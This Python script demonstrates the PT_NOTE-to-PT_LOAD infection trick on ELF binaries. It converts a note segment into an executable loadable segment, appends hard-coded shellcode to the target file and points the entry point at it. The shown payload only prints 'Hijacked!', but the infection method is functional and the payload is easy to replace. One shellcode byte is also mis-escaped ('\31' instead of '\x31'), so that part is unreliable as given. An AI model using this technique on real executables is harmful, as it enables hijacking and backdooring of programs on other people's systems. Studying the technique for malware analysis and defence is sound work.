"""
This short script shows how easy it is to inject shellcode into an ELF file
using the elf library. This is an example of the famous PT_NOTE overwriting
trick.
"""

import sys
import elf

PT_NOTE = 4
PT_LOAD = 1
PF_X = 1
PF_R = 4

try:
    ELF_FILE = elf.ELFFile(sys.argv[1])
except IndexError:
    print("Usage: {} ELF_BINARY".format(sys.argv[0]))
    sys.exit(1)

# this shellcode writes 'Hijacked!\n' to stdout and then exits with the return
# value 1. It uses jmp-call-pop to be position independant
CODE = b"\xeb\x22\x5e\x48\31\xff\x66\xbf\x01\x00\x48\x31\xc0\xb0\x01\x48\x31"\
       b"\xd2\xb2\x0b\x0f\x05\x48\x31\xc0\xb0\x3c\x48\x31\xd2\xb2\x01\xfe\xca"\
       b"\x0f\x05\xe8\xd9\xff\xff\xffHijacked!\x0a\x00"

# search a PT_NOTE program header to exploit
try:
    SOME_NOTE_PHDR = [phdr for phdr in ELF_FILE.program_headers
                      if phdr.p_type == PT_NOTE].pop()
except IndexError:
    MSG = "No PT_NOTE segment found in {}, exiting."
    print(MSG.format(sys.argv[1]), file=sys.stderr)
    sys.exit(2)

ADDR = 0x8000

SOME_NOTE_PHDR.p_type = PT_LOAD  # load this segment at load time
SOME_NOTE_PHDR.p_flags = PF_X | PF_R  # make segment executable
SOME_NOTE_PHDR.p_offset = ELF_FILE.size  # code will be at the end of the file
# the ELF format specifies that p_vaddr == p_offset (mod PAGESIZE)
SOME_NOTE_PHDR.p_vaddr = ADDR + (ELF_FILE.size % 0x1000) - (ADDR % 0x1000)
SOME_NOTE_PHDR.p_filesz = SOME_NOTE_PHDR.p_memsz = len(CODE)  # shellcode size
SOME_NOTE_PHDR.p_align = 0x1000  # align segment to pagesize

ELF_FILE.overwrite_at(ELF_FILE.size, CODE)  # append code
ELF_FILE.header.e_entry = SOME_NOTE_PHDR.p_vaddr  # set entry to inserted code
